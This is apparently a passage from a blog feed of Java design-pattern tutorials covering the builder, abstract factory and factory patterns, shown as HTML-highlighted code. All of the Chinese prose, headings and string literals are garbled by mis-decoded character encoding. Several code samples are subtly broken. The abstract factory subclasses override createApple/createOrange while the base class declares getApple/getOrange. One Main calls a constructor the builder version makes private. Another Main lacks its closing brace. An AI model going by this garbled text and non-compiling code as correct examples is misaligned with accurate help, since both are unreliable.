class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;String&gt; awards = Arrays.asList(<span class="hljs-string">&quot;LPL æ˜¥å­£èµ›å† å†›&quot;</span>,<span class="hljs-string">&quot;ä¸Šæµ·Majorå† å†›&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;å°æ˜&quot;</span>, <span class="hljs-string">&quot;ç”·&quot;</span>, <span class="hljs-string">&quot;è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯&quot;</span>, awards);<br>        System.out.println(student);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å»ºé€ è€…æ¨¡å¼"><a href="#å»ºé€ è€…æ¨¡å¼" class="headerlink" title="å»ºé€ è€…æ¨¡å¼"></a>å»ºé€ è€…æ¨¡å¼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> age;<br>    String name;<br>    String gender; <br>    String profession;<br>    List&lt;String&gt; awards;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender; <br>        <span class="hljs-built_in">this</span>.profession = profession;<br>        <span class="hljs-built_in">this</span>.awards = awards;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StudentBuilder <span class="hljs-title function_">builder</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//é€šè¿‡builderç›´æ¥è·å–å»ºé€ è€…</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StudentBuilder</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentBuilder</span> &#123;<br>        <span class="hljs-type">int</span> id;<br>        <span class="hljs-type">int</span> age;<br>        String name;<br>        String gender;<br>        String profession;<br>        List&lt;String&gt; awards;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">id</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>            <span class="hljs-built_in">this</span>.id = id;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">age</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>            <span class="hljs-built_in">this</span>.age = age;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">name</span><span class="hljs-params">(String name)</span> &#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">gender</span><span class="hljs-params">(String gender)</span> &#123;<br>            <span class="hljs-built_in">this</span>.gender = gender;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">profession</span><span class="hljs-params">(String profession)</span> &#123;<br>            <span class="hljs-built_in">this</span>.profession = profession;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">awards</span><span class="hljs-params">(List&lt;String&gt; awards)</span> &#123;<br>            <span class="hljs-built_in">this</span>.awards = awards;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Student <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(id, age, name, gender, profession, awards);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Student.<span class="hljs-type">StudentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> Student.builder();<br>        List&lt;String&gt; awards = Arrays.asList(<span class="hljs-string">&quot;LPL æ˜¥å­£èµ›å† å†›&quot;</span>, <span class="hljs-string">&quot;ä¸Šæµ·Majorå† å†›&quot;</span>);<br>        builder.id(<span class="hljs-number">1</span>).name(<span class="hljs-string">&quot;John Doe&quot;</span>).gender(<span class="hljs-string">&quot;Male&quot;</span>).awards(awards).profession(<span class="hljs-string">&quot;&quot;</span>).build();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>å»ºé€ è€…æ¨¡å¼æä¾›äº†ä¸€ç§æ¸…æ™°ã€çµæ´»ä¸”æ˜“äºç»´æŠ¤çš„æ–¹å¼æ¥æ„å»ºå¯¹è±¡ï¼Œå°¤å…¶é€‚ç”¨äºå…·æœ‰å¤šä¸ªå‚æ•°å’Œå¤æ‚æ„å»ºé€»è¾‘çš„æƒ…å†µã€‚</strong></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAè®¾è®¡æ¨¡å¼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ›å»ºå‹-æŠ½è±¡å·¥å‚æ¨¡å¼</title>
    <link href="/2024/05/07/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
    <url>/2024/05/07/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>â€‹å·¥å‚æ¨¡å¼å…³æ³¨äºåˆ›å»ºå•ä¸ªå¯¹è±¡ï¼Œé€šè¿‡ä¸€ä¸ªå·¥å‚ç±»æ¥å®ç°ã€‚ä½†æ˜¯å‡å¦‚é‡åˆ°éœ€è¦åˆ›å»ºä¸€ç³»åˆ—ç›¸å…³æˆ–ç›¸äº’ä¾èµ–çš„å¯¹è±¡çš„æ—¶å€™ï¼Œå°±æœ‰äº›ä¹åŠ›äº†ï¼Œè€ŒæŠ½è±¡å·¥å‚æ¨¡å¼èƒ½å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><h2 id="æŠ½è±¡å·¥å‚æ¨¡å¼"><a href="#æŠ½è±¡å·¥å‚æ¨¡å¼" class="headerlink" title="æŠ½è±¡å·¥å‚æ¨¡å¼"></a>æŠ½è±¡å·¥å‚æ¨¡å¼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//æ°´æœæŠ½è±¡ç±»</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Fruit</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name +<span class="hljs-string">&quot;@&quot;</span>+hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//æ°´æœå®ç°ç±»</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;è‹¹æœ&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Orange</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//æ°´æœå®ç°ç±»</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Orange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;æ©˜å­&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;  <span class="hljs-comment">//æŠ½è±¡æ°´æœå·¥å‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Fruit <span class="hljs-title function_">getApple</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Fruit <span class="hljs-title function_">getOrange</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createApple</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createOrange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// åœ¨è‹¹æœå·¥å‚ä¸­ä¸åˆ›å»ºæ©˜å­</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrangeFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createApple</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// åœ¨æ©˜å­å·¥å‚ä¸­ä¸åˆ›å»ºè‹¹æœ</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createOrange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AbstractFruitFactory</span> <span class="hljs-variable">appleFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleFactory</span>();<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">apple</span> <span class="hljs-operator">=</span> appleFactory.createApple();<br>        System.out.println(apple);<br><br>        <span class="hljs-type">AbstractFruitFactory</span> <span class="hljs-variable">orangeFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrangeFactory</span>();<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">orange</span> <span class="hljs-operator">=</span> orangeFactory.createOrange();<br>        System.out.println(orange);<br>    &#125;<br><br></code></pre></td></tr></table></figure><h2 id="å·¥å‚æ¨¡å¼å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼çš„åŒºåˆ«"><a href="#å·¥å‚æ¨¡å¼å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼çš„åŒºåˆ«" class="headerlink" title="å·¥å‚æ¨¡å¼å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼çš„åŒºåˆ«"></a>å·¥å‚æ¨¡å¼å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼çš„åŒºåˆ«</h2><p>â€‹<strong>å·¥å‚æ¨¡å¼å…³æ³¨äºåˆ›å»ºå•ä¸ªå¯¹è±¡ï¼Œé€šå¸¸æ˜¯é€šè¿‡ä¸€ä¸ªå·¥å‚ç±»æ¥å®ç°ã€‚</strong></p><p>â€‹<strong>å·¥å‚æ¨¡å¼é€‚ç”¨äºåˆ›å»ºå•ä¸ªå¯¹è±¡çš„åœºæ™¯ï¼ŒæŠ½è±¡å·¥å‚æ¨¡å¼é€‚ç”¨äºéœ€è¦åˆ›å»ºä¸€ç³»åˆ—ç›¸å…³å¯¹è±¡çš„åœºæ™¯ã€‚</strong></p><p>â€‹<strong>æŠ½è±¡å·¥å‚æ¨¡å¼åˆ™æ›´åŠ å°é—­ï¼Œå› ä¸ºå®ƒéœ€è¦ä¸€æ¬¡æ€§å®šä¹‰æ‰€æœ‰äº§å“æ—çš„åˆ›å»ºæ–¹æ³•ã€‚</strong></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAè®¾è®¡æ¨¡å¼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ›å»ºå‹-å·¥å‚æ¨¡å¼</title>
    <link href="/2024/05/03/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
    <url>/2024/05/03/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>â€‹ä¸ºäº†å†™å‡ºæ›´â€œä¼˜é›…â€çš„ä»£ç ï¼Œé‚å‡†å¤‡æ¥å­¦ä¹ JAVAçš„è®¾è®¡æ¨¡å¼ã€‚</p><p>â€‹ä»¥å‰ä»æ¥æ²¡æœ‰å†™æ–‡ç« çš„ä¹ æƒ¯ï¼Œå‘ç°å­¦è¿‡çš„ä¸œè¥¿å®¹æ˜“å¿˜è®°ï¼Œä¹Ÿå¯èƒ½æ˜¯å­¦çš„è¿‡äºè¡¨é¢ï¼Œä¸å¤Ÿæ·±å…¥ï¼Œäº†è§£äº†è´¹æ›¼å­¦ä¹ æ³•ï¼Œå†³å®šå¼€å§‹ç æ–‡ç« ï¼Œå½“ä½œå­¦ä¹ è®°å½•å§ï¼Œä¹Ÿæ–¹ä¾¿å›é¡¾ã€‚</p><h2 id="è®¾è®¡æ¨¡å¼"><a href="#è®¾è®¡æ¨¡å¼" class="headerlink" title="è®¾è®¡æ¨¡å¼"></a>è®¾è®¡æ¨¡å¼</h2><p>â€‹JAVAçš„è®¾è®¡æ¨¡å¼åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ›å»ºå‹æ¨¡å¼ï¼ˆå…³æ³¨å¯¹è±¡çš„åˆ›å»ºæœºåˆ¶ï¼‰ã€ç»“æ„æ€§æ¨¡å¼ï¼ˆå…³æ³¨ç±»å’Œå¯¹è±¡ä¹‹é—´çš„ç»„åˆï¼‰ã€è¡Œä¸ºå‹æ¨¡å¼ï¼ˆå…³æ³¨å¯¹è±¡ä¹‹é—´çš„é€šä¿¡ä»¥åŠè´£ä»»çš„åˆ†é…ï¼‰</p><h2 id="ç®€å•å·¥å‚æ¨¡å¼"><a href="#ç®€å•å·¥å‚æ¨¡å¼" class="headerlink" title="ç®€å•å·¥å‚æ¨¡å¼"></a>ç®€å•å·¥å‚æ¨¡å¼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//æ°´æœæŠ½è±¡ç±»</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Fruit</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name +<span class="hljs-string">&quot;@&quot;</span>+hashCode();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//ç»§æ‰¿æ°´æœ</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;è‹¹æœ&quot;</span>);<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Orange</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123;<span class="hljs-comment">//ç»§æ‰¿æ°´æœ</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Orange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;æ©˜å­&quot;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimplefruitFactory</span> &#123; <span class="hljs-comment">//æ°´æœå·¥å‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Fruit <span class="hljs-title function_">getFruit</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (type) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;è‹¹æœ&quot;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;æ©˜å­&quot;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// å¤„ç†æœªçŸ¥ç±»å‹</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> SimplefruitFactory.getFruit(<span class="hljs-string">&quot;æ©˜å­&quot;</span>); <span class="hljs-comment">//é€šè¿‡å·¥å‚åˆ›å»º</span><br>        System.out.println(fruit);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œæ¯”å¦‚Appleçš„æ„é€ æ–¹æ³•éœ€è¦æ–°çš„å‚æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹å·¥å‚é‡Œé¢çš„å‚æ•°ï¼Œå› ä¸ºå…¶ä»–åœ°æ–¹æ˜¯é€šè¿‡å·¥å‚è·å¾—çš„æ°´æœçš„å®ä¾‹ã€‚</p><p>å‡å¦‚ç°åœ¨éœ€è¦å¢åŠ ä¸€ä¸ªæ–°çš„æ°´æœç±»å‹ï¼Œå°±éœ€è¦å¯¹å·¥å‚è¿›è¡Œä¿®æ”¹ã€‚è¿™ä¸ç¬¦åˆå¼€é—­åŸåˆ™ã€‚ï¼ˆå¼€é—­åŸåˆ™ï¼šä¸€ä¸ªè½¯ä»¶å®ä½“ï¼Œæ¯”å¦‚ç±»ã€æ¨¡å—å’Œå‡½æ•°åº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ï¼‰ã€‚</p><h2 id="å·¥å‚æ¨¡å¼"><a href="#å·¥å‚æ¨¡å¼" class="headerlink" title="å·¥å‚æ¨¡å¼"></a>å·¥å‚æ¨¡å¼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FruitFactory</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span>&gt;&#123; <span class="hljs-comment">//å°†æ°´æœå·¥å‚æŠ½è±¡ä¸ºæŠ½è±¡ç±»ï¼Œé€šè¿‡æ³›å‹æŒ‡å®šæ°´æœç±»å‹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> T <span class="hljs-title function_">getFruit</span><span class="hljs-params">()</span>;  <span class="hljs-comment">//ä¸åŒçš„æ°´æœå·¥å‚ï¼Œç”Ÿäº§ä¸åŒçš„æ°´æœ</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleFactora</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FruitFactory</span>&lt;Apple&gt;&#123; <span class="hljs-comment">//å‡å¦‚éœ€è¦è‹¹æœå°±åˆ›å»ºä¸€ä¸ªè‹¹æœå·¥å‚ç±»ï¼Œæ–°å¢æ©˜å­ï¼Œè“è“ï¼Œç­‰ç­‰åŒç†</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Apple <span class="hljs-title function_">getFruit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 